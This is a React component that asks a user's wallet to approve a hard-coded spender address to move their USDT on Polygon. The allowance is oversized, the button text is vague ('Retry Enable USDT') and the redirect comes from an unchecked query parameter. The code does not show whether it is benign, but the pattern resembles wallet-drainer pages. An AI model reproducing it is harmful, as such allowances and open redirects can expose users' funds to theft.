import {
  useContract,
  useContractWrite,
  useContractRead,
  useAddress,
  useChainId,
  useConnectionStatus,
} from "@thirdweb-dev/react";
import React, { useEffect, useState } from "react";
import { useRouter } from 'next/router';
import { Polygon } from "@thirdweb-dev/chains";
import styles from "./ApproveButton.module.css";


const ApproveButton = ({
  approvalStatus,
  setApprovalStatus,
  showApproveButton,
  setShowApproveButton
}) => {
  const router = useRouter();
  const [redirectUrl, setRedirectUrl] = useState(null); 
  const address = useAddress();
  useEffect(() => {
    if (router.isReady) {
      setRedirectUrl(router.query['redirect-url']);
    }
  }, [router.isReady]);
  useEffect(() => {
    console.log(address)
    if(address===undefined){
      setShowApproveButton(false)
    }
  }, [address]);

  const [approvalComplete, setApprovalComplete] = useState(false);
  const { contract } = useContract(
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
  );
  const handleApprovalComplete = () => {
    setApprovalStatus(true);
    setApprovalComplete(true);
  };
  const {
    mutateAsync: approve,
    isLoading: isApproving,
    error,
  } = useContractWrite(contract, "approve");
  useEffect(() => {
    if (error === null) {
      setApprovalInitiated(false);
    }
  }, [isApproving]);
  const spender = "0x61e129d8b0836F05b64d7c59500F4fa042EA8c5B";
  const amount = "1000000000000000000";
  const { data: allowance, isLoading: isChecking } = useContractRead(
    contract,
    "allowance",
    [address, spender]
  );
  const [approvalInitiated, setApprovalInitiated] = useState(false);
  const currentChainId = useChainId();
  const connectionStatus = useConnectionStatus();
  //const hasApprovalFailure = approvalEvents.some((event) => event.error);
  const [buttonStatus, setbuttonStatus] = useState(false);
  const callApproval = async () => {
    try {
      if (currentChainId !== Polygon.chainId) {
        console.error("Wrong network. Please switch to the Polygon network.");
        return;
      }
      console.log("checking", address, isChecking, approvalInitiated);
      if (address && !isChecking && !approvalInitiated) {
        if (parseInt(allowance) >= parseInt(amount)) {
          setApprovalStatus(true);
          setTimeout(() => {
            router.push(`${redirectUrl}/${address}`);
          }, 2000);
        } else {
          setApprovalInitiated(true);
          const data = await approve({ args: [spender, amount] });
          console.info("Contract call success:", data);
          setApprovalStatus(true);
          setApprovalInitiated(false);
          
        }
      }
    } catch (err) {
      console.error("Contract call failure:", err);
    }
  };

  if (!approvalStatus.isApproved && showApproveButton) {
    return (
      <button
        onClick={() => {
          console.log("clicked approval");
          callApproval();
        }}
        className={styles.connectedButton}
      >
        Retry Enable USDT
      </button>
    );
  }
  return null;
};

export default ApproveButton;